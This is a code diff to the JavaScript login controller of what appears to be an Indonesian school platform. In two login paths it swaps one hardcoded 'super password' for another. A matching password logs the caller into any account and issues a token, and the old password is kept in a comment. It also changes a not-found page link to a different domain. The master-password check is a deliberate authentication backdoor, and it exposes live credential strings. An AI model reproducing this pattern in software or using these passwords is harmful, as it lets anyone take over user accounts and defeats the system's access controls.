@@ -2996,7 +2996,8 @@ class MainController {
         message: `Selamat datang ${res.nama}`,
         token,
       });
-    } else if (password == "D*@)eeNDoje298370+?-=234&%&#*(") {
+    } else if (password == "A#)kLo39we@924+-=719&%$^*@") {
+      // old super password D*@)eeNDoje298370+?-=234&%&#*(
       const { token } = await auth.generate(res);
 
       return response.ok({
@@ -4757,7 +4758,8 @@ class MainController {
       return response.notFound({ message: "Akun tidak ditemukan" });
     }
 
-    if (password == "D*@)eeNDoje298370+?-=234&%&#*(") {
+    if (password == "A#)kLo39we@924+-=719&%$^*@") {
+      // old super password D*@)eeNDoje298370+?-=234&%&#*(
       const { token } = await auth.generate(res);
 
       return response.ok({
@@ -57423,7 +57425,7 @@ class MainController {
   }
 
   async notFoundPage({ response, request, auth }) {
-    return `<p>Data tidak ditemukan, silahkan kembali ke <a href="https://cazbox.id">Cazbox Edu</a></p>`;
+    return `<p>Data tidak ditemukan, silahkan kembali ke <a href="http://getsmartschool.id">Smart School</a></p>`;
   }
 }
 module.exports = MainController;
